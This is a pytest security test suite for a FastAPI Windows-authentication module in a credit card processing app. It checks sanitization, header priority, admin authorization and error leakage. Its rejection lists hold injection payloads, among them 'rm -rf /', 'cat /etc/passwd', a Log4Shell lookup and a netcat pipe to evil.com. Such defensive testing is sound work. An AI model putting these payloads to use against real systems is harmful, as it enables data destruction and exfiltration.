#!/usr/bin/env python3
"""
Comprehensive QA/QC Security Test Suite for Windows Authentication System
Task 2.2 - Credit Card Processor

This test suite validates all security aspects of the Windows authentication implementation
according to OWASP guidelines and the original task requirements.
"""

import sys
import os
import pytest
import logging
from datetime import datetime
from unittest.mock import Mock, patch, MagicMock
from fastapi import Request, HTTPException, status
from fastapi.testclient import TestClient
import asyncio

# Add app directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'app'))

from app.auth import (
    sanitize_username,
    extract_windows_username,
    get_development_user,
    get_current_user,
    require_admin,
    validate_auth_headers,
    UserInfo,
    AuthenticationError,
    AuthorizationError,
    USERNAME_PATTERN,
    DOMAIN_PATTERN
)
from app.config import settings
from app.main import app

class TestSecurityValidation:
    """Security validation tests for Windows Authentication System"""

    def setup_method(self):
        """Setup test environment"""
        self.client = TestClient(app)
        settings.debug = True  # Enable debug mode for testing
        
    def create_mock_request(self, headers=None, query_params=None, client_host="127.0.0.1"):
        """Create a mock FastAPI request object"""
        request = Mock(spec=Request)
        request.headers = headers or {}
        request.query_params = query_params or {}
        request.client = Mock()
        request.client.host = client_host
        return request

class TestInputValidationSecurity(TestSecurityValidation):
    """Test input validation and sanitization security (OWASP A03:2021)"""

    def test_username_pattern_security(self):
        """Test username pattern prevents injection attacks"""
        # Valid usernames
        valid_usernames = [
            "rcox", "mikeh", "tomj", "user123", 
            "test.user", "user-name", "user_name"
        ]
        for username in valid_usernames:
            assert USERNAME_PATTERN.match(username), f"Valid username failed: {username}"

        # Invalid/malicious usernames - injection attempts
        malicious_usernames = [
            "user'; DROP TABLE users;--",
            "user<script>alert('xss')</script>",
            "user&lt;script&gt;",
            "user/../../../etc/passwd",
            "user\x00admin",
            "user\r\nadmin",
            "user%27%20OR%201=1",
            "user' OR 1=1--",
            "user\\..\\admin",
            "user${jndi:ldap://evil.com}",
            "",  # Empty username
            "a" * 51,  # Too long username
        ]
        for username in malicious_usernames:
            assert not USERNAME_PATTERN.match(username), f"Malicious username allowed: {username}"

    def test_domain_pattern_security(self):
        """Test domain pattern prevents injection in domain\\username format"""
        # Valid domain usernames
        valid_domains = [
            "DOMAIN\\rcox", "company.com\\user", "sub.domain.com\\test"
        ]
        for domain_user in valid_domains:
            assert DOMAIN_PATTERN.match(domain_user), f"Valid domain user failed: {domain_user}"

        # Invalid/malicious domain usernames
        malicious_domains = [
            "domain\\user'; DROP TABLE;--",
            "domain<script>\\user",
            "domain\\user/../../../etc",
            "domain\\user\x00admin",
        ]
        for domain_user in malicious_domains:
            assert not DOMAIN_PATTERN.match(domain_user), f"Malicious domain user allowed: {domain_user}"

    def test_sanitize_username_injection_prevention(self):
        """Test username sanitization prevents various injection attacks"""
        # SQL injection attempts
        sql_injections = [
            "admin'; DROP TABLE users;--",
            "user' OR '1'='1",
            "user'; UPDATE users SET admin=1;--"
        ]
        for injection in sql_injections:
            result = sanitize_username(injection)
            assert result is None, f"SQL injection not prevented: {injection}"

        # XSS attempts
        xss_attempts = [
            "user<script>alert('xss')</script>",
            "user&lt;script&gt;alert('xss')&lt;/script&gt;",
            "user\"><script>alert(1)</script>"
        ]
        for xss in xss_attempts:
            result = sanitize_username(xss)
            assert result is None, f"XSS attempt not prevented: {xss}"

        # Path traversal attempts
        path_traversals = [
            "user/../../../etc/passwd",
            "user\\..\\..\\windows\\system32",
            "user/../../../../bin/sh"
        ]
        for path in path_traversals:
            result = sanitize_username(path)
            assert result is None, f"Path traversal not prevented: {path}"

        # LDAP injection attempts
        ldap_injections = [
            "user)(|(cn=*))",
            "user*)((userPassword=*)",
            "user)(cn=*))((|(cn=*"
        ]
        for ldap in ldap_injections:
            result = sanitize_username(ldap)
            assert result is None, f"LDAP injection not prevented: {ldap}"

        # Command injection attempts
        cmd_injections = [
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc evil.com 1337"
        ]
        for cmd in cmd_injections:
            result = sanitize_username(cmd)
            assert result is None, f"Command injection not prevented: {cmd}"

    def test_header_injection_prevention(self):
        """Test prevention of header injection attacks"""
        request = self.create_mock_request({
            'remote_user': "user\r\nX-Admin: true",
            'http_remote_user': "user\nSet-Cookie: admin=true"
        })
        
        validation = validate_auth_headers(request)
        assert len(validation["security_warnings"]) > 0
        assert len(validation["invalid_headers"]) > 0

class TestAuthenticationSecurity(TestSecurityValidation):
    """Test authentication mechanism security (OWASP A07:2021)"""

    def test_windows_header_extraction_priority(self):
        """Test Windows header extraction follows correct priority"""
        # Test priority order: remote_user > http_remote_user > x-forwarded-user
        request = self.create_mock_request({
            'x-forwarded-user': 'user3',
            'remote_user': 'user1',  # Should have highest priority
            'http_remote_user': 'user2'
        })
        
        username = extract_windows_username(request)
        assert username == 'user1', "Header priority not correctly implemented"

    def test_authentication_logging(self):
        """Test that authentication attempts are properly logged"""
        with patch('app.auth.auth_logger') as mock_logger:
            # Successful authentication
            request = self.create_mock_request({'remote_user': 'rcox'})
            username = extract_windows_username(request)
            
            assert username == 'rcox'
            mock_logger.info.assert_called()
            
            # Failed authentication
            request = self.create_mock_request({})
            username = extract_windows_username(request)
            
            assert username is None
            mock_logger.warning.assert_called()

    @pytest.mark.asyncio
    async def test_get_current_user_security(self):
        """Test get_current_user security implementation"""
        # Valid authentication
        request = self.create_mock_request({'remote_user': 'rcox'})
        user = await get_current_user(request)
        
        assert user.username == 'rcox'
        assert user.is_admin == True
        assert user.is_authenticated == True
        assert user.auth_method == 'windows'

        # Invalid authentication should raise AuthenticationError
        request = self.create_mock_request({})
        with pytest.raises(AuthenticationError):
            await get_current_user(request)

    @pytest.mark.asyncio
    async def test_development_fallback_security(self):
        """Test development fallback authentication security"""
        # Should only work in debug mode
        settings.debug = True
        request = self.create_mock_request(headers={'x-dev-user': 'testuser'})
        
        dev_user = get_development_user(request)
        assert dev_user == 'testuser'

        # Should not work in production mode
        settings.debug = False
        dev_user = get_development_user(request)
        assert dev_user is None

        # Reset debug mode
        settings.debug = True

class TestAuthorizationSecurity(TestSecurityValidation):
    """Test authorization and access control security (OWASP A01:2021)"""

    @pytest.mark.asyncio
    async def test_admin_authorization_enforcement(self):
        """Test admin authorization is properly enforced"""
        # Admin user should pass
        admin_user = UserInfo(
            username='rcox',
            is_admin=True,
            is_authenticated=True,
            auth_method='windows',
            timestamp=datetime.utcnow()
        )
        
        result = await require_admin(admin_user)
        assert result == admin_user

        # Non-admin user should fail
        regular_user = UserInfo(
            username='regularuser',
            is_admin=False,
            is_authenticated=True,
            auth_method='windows',
            timestamp=datetime.utcnow()
        )
        
        with pytest.raises(AuthorizationError):
            await require_admin(regular_user)

    def test_admin_user_validation(self):
        """Test admin user validation logic"""
        admin_users = ['rcox', 'mikeh', 'tomj']
        
        # Test case insensitive matching
        for admin in admin_users:
            # Lowercase
            assert admin.lower() in [user.lower() for user in settings.admin_users]
            # Uppercase
            assert admin.upper() in [user.lower() for user in [u.upper() for u in settings.admin_users]]
            # Mixed case
            assert admin.capitalize() in [user.lower() for user in [u.capitalize() for u in settings.admin_users]]

        # Non-admin users
        non_admin_users = ['hacker', 'attacker', 'guest', 'anonymous']
        for user in non_admin_users:
            assert user.lower() not in [admin.lower() for admin in settings.admin_users]

class TestAPIEndpointSecurity(TestSecurityValidation):
    """Test API endpoint security implementation"""

    def test_current_user_endpoint_security(self):
        """Test /api/auth/current-user endpoint security"""
        # Without authentication headers - should fail
        response = self.client.get("/api/auth/current-user")
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

        # With valid authentication headers
        response = self.client.get(
            "/api/auth/current-user",
            headers={'remote_user': 'rcox'}
        )
        assert response.status_code == 200
        data = response.json()
        assert data['username'] == 'rcox'
        assert data['is_admin'] == True

    def test_admin_endpoint_security(self):
        """Test admin-only endpoint security"""
        # Regular user - should fail
        response = self.client.get(
            "/api/auth/admin-test",
            headers={'remote_user': 'regularuser'}
        )
        assert response.status_code == status.HTTP_403_FORBIDDEN

        # Admin user - should succeed
        response = self.client.get(
            "/api/auth/admin-test",
            headers={'remote_user': 'rcox'}
        )
        assert response.status_code == 200
        data = response.json()
        assert data['admin'] == True

    def test_auth_status_endpoint_security(self):
        """Test authentication status endpoint security"""
        # Should work without authentication (optional auth)
        response = self.client.get("/api/auth/status")
        assert response.status_code == 200
        data = response.json()
        assert data['authenticated'] == False

        # Should work with authentication
        response = self.client.get(
            "/api/auth/status",
            headers={'remote_user': 'rcox'}
        )
        assert response.status_code == 200
        data = response.json()
        assert data['authenticated'] == True

class TestSecurityHeadersImplementation(TestSecurityValidation):
    """Test security headers implementation (OWASP A05:2021)"""

    def test_security_headers_present(self):
        """Test that security headers are properly implemented"""
        response = self.client.get("/health")
        
        # Check for security headers
        expected_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options', 
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Referrer-Policy',
            'Content-Security-Policy'
        ]
        
        for header in expected_headers:
            assert header in response.headers, f"Security header missing: {header}"

    def test_cors_security_configuration(self):
        """Test CORS security configuration"""
        # OPTIONS preflight request
        response = self.client.options(
            "/api/auth/current-user",
            headers={
                'Origin': 'http://localhost:3000',
                'Access-Control-Request-Method': 'GET'
            }
        )
        
        # Should allow localhost:3000 in development
        assert 'Access-Control-Allow-Origin' in response.headers

class TestErrorHandlingSecurity(TestSecurityValidation):
    """Test error handling security (OWASP A09:2021)"""

    def test_authentication_error_handling(self):
        """Test authentication errors don't leak sensitive information"""
        response = self.client.get("/api/auth/current-user")
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
        data = response.json()
        assert 'detail' in data
        assert 'type' in data
        assert data['type'] == 'authentication_error'
        
        # Should not contain sensitive system information
        detail = data['detail'].lower()
        sensitive_terms = ['database', 'config', 'path', 'file', 'system', 'internal']
        for term in sensitive_terms:
            assert term not in detail, f"Sensitive term '{term}' found in error message"

    def test_authorization_error_handling(self):
        """Test authorization errors don't leak sensitive information"""
        response = self.client.get(
            "/api/auth/admin-test",
            headers={'remote_user': 'regularuser'}
        )
        
        assert response.status_code == status.HTTP_403_FORBIDDEN
        data = response.json()
        assert 'detail' in data
        assert 'type' in data
        assert data['type'] == 'authorization_error'

class TestAttackVectorPrevention(TestSecurityValidation):
    """Test prevention of common attack vectors"""

    def test_header_spoofing_prevention(self):
        """Test prevention of header spoofing attacks"""
        # Multiple conflicting auth headers
        response = self.client.get(
            "/api/auth/current-user",
            headers={
                'remote_user': 'rcox',
                'x-forwarded-user': 'attacker'
            }
        )
        
        # Should use highest priority header (remote_user)
        assert response.status_code == 200
        data = response.json()
        assert data['username'] == 'rcox'

    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        # Attempt to access admin endpoint with regular user
        response = self.client.get(
            "/api/auth/admin-test",
            headers={'remote_user': 'normaluser'}
        )
        
        assert response.status_code == status.HTTP_403_FORBIDDEN

    def test_session_fixation_prevention(self):
        """Test session fixation prevention"""
        # Each request should validate authentication independently
        user_info_response1 = self.client.get(
            "/api/auth/user-info",
            headers={'remote_user': 'rcox'}
        )
        
        user_info_response2 = self.client.get(
            "/api/auth/user-info",
            headers={'remote_user': 'mikeh'}
        )
        
        # Should get different user info for different headers
        assert user_info_response1.status_code == 200
        assert user_info_response2.status_code == 200
        
        data1 = user_info_response1.json()
        data2 = user_info_response2.json()
        
        assert data1['user']['username'] == 'rcox'
        assert data2['user']['username'] == 'mikeh'

def run_comprehensive_security_tests():
    """Run all comprehensive security tests"""
    print("🔒 Starting Comprehensive QA/QC Security Test Suite for Windows Authentication System")
    print("=" * 80)
    
    # Run tests with pytest
    test_result = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--disable-warnings"
    ])
    
    if test_result == 0:
        print("\n✅ ALL SECURITY TESTS PASSED")
        print("Windows Authentication System meets all security requirements")
    else:
        print("\n❌ SECURITY TESTS FAILED")
        print("Security vulnerabilities detected - review required")
    
    return test_result == 0

if __name__ == "__main__":
    success = run_comprehensive_security_tests()
    sys.exit(0 if success else 1)